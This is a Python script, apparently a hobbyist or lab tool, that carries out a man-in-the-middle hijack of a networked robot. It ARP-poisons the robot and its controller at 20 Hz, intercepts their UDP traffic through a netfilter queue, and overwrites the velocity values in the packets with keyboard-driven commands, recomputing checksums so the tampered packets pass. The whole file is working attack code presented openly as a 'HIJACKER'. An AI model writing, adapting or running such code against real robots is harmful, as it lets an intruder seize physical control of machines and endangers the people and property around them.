from scapy.all import *
from netfilterqueue import NetfilterQueue
import threading
import time
import subprocess
import struct
import sys
import select
import tty
import termios

# --- SETTINGS ---
robot_ip      = "192.168.0.194"
controller_ip = "192.168.0.16"
interface     = "wlan0"
queue_number  = 1

# Shared control variables
target_linear  = 0.0
target_angular = 0.0

# --- SSH KEYBOARD ENGINE (Non-Blocking) ---
def get_key():
    old_settings = termios.tcgetattr(sys.stdin)
    try:
        tty.setcbreak(sys.stdin.fileno())
        if select.select([sys.stdin], [], [], 0.1)[0]:
            return sys.stdin.read(1)
        return None
    finally:
        termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old_settings)

def keyboard_control_thread():
    global target_linear, target_angular
    lin_speed = 2  
    ang_speed = 2.0   
    
    print("[*] HIJACKER READY: W/S (Fwd/Back), A/D (Left/Right), SPACE (Stop)")
    while True:
        key = get_key()
        if key:
            k = key.lower()
            if k == 'w':
                target_linear = lin_speed; target_angular = 0.0
            elif k == 's':
                target_linear = -lin_speed; target_angular = 0.0
            elif k == 'a':
                target_linear = 0.0; target_angular = ang_speed
            elif k == 'd':
                target_linear = 0.0; target_angular = -ang_speed
            elif k == ' ':
                target_linear = 0.0; target_angular = 0.0
                print("\n[!] EMERGENCY STOP - NEUTRAL SENT")
        time.sleep(0.02)

# --- MAC RESOLUTION & ARP SPOOFING ---
def get_mac(ip):
    subprocess.run(["ping", "-c", "1", "-W", "1", ip], stdout=subprocess.DEVNULL)
    try:
        with open("/proc/net/arp") as f:
            for line in f:
                fields = line.split()
                if fields[0] == ip: return fields[3]
    except: pass
    return None

def spoof(target_ip, host_ip, target_mac):
    packet = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=host_ip)
    sendp(packet, iface=interface, verbose=False)

def arp_poison_thread(robot_mac, controller_mac):
    print("[*] EMERGENCY ARP FLOOD ACTIVE - 20Hz Frequency")
    while True:
        # High-frequency spoofing (every 0.05s) to stay ahead of the controller
        spoof(robot_ip, controller_ip, robot_mac)
        spoof(controller_ip, robot_ip, controller_mac)
        time.sleep(0.05) 

# --- SURGICAL PACKET INJECTION ---
def process_packet(packet):
    global target_linear, target_angular
    try:
        scapy_pkt = IP(packet.get_payload())
        if scapy_pkt.haslayer(UDP) and scapy_pkt.haslayer(Raw):
            raw_data = scapy_pkt[Raw].load
            
            # Find the Data Marker (0x15 0x05)
            marker = b'\x15\x05'
            marker_pos = raw_data.find(marker)
            
            if marker_pos != -1:
                # Find the CDR Header (00 00 01 00)
                cdr_header = b'\x00\x00\x01\x00'
                data_start = raw_data.find(cdr_header, marker_pos)
                
                if data_start != -1:
                    # Based on your e-309 and e-305 errors, the data is likely at +8
                    lin_x_off = data_start + 4
                    ang_z_off = lin_x_off + 40 
                    
                    if len(raw_data) >= ang_z_off + 8:
                        # Perform Injection
                        new_payload = (
                            raw_data[:lin_x_off] + 
                            struct.pack('<d', float(target_linear)) + 
                            raw_data[lin_x_off+8:ang_z_off] + 
                            struct.pack('<d', float(target_angular)) + 
                            raw_data[ang_z_off+8:]
                        )
                        
                        scapy_pkt[Raw].load = new_payload
                        
                        # Recalculate Checksums
                        del scapy_pkt[IP].len; del scapy_pkt[IP].chksum
                        del scapy_pkt[UDP].len; del scapy_pkt[UDP].chksum
                        
                        packet.set_payload(bytes(scapy_pkt))
                        
                        # Only print HUD if we are actually moving to avoid spam
                        if target_linear != 0 or target_angular != 0:
                            sys.stdout.write(f"\r[*] INJECTING: L:{target_linear:.1f} A:{target_angular:.1f}   ")
                            sys.stdout.flush()

    except Exception:
        pass
    packet.accept()

if __name__ == "__main__":
    r_mac = get_mac(robot_ip)
    c_mac = get_mac(controller_ip)
    
    if r_mac and c_mac:
        # Start Threads
        threading.Thread(target=arp_poison_thread, args=(r_mac, c_mac), daemon=True).start()
        threading.Thread(target=keyboard_control_thread, daemon=True).start()
        
        # Start Queue
        nfqueue = NetfilterQueue()
        nfqueue.bind(queue_number, process_packet)
        print(f"[*] MITM HIJACK STARTED: {controller_ip} -> {robot_ip}")
        try:
            nfqueue.run()
        except KeyboardInterrupt:
            print("\n[*] Shutting down...")
            nfqueue.unbind()